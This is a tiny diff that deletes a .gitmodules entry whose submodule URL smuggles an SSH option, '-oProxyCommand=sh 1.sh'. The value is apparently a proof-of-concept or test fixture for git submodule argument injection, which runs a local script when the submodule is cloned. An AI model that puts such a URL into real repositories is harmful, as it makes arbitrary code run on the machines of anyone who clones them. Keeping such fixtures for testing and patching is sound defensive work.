@@ -1,3 +1,0 @@
-[submodule "EmptyRepo"]
-	path = EmptyRepo
-    url = ssh://"-oProxyCommand=sh 1.sh" /test
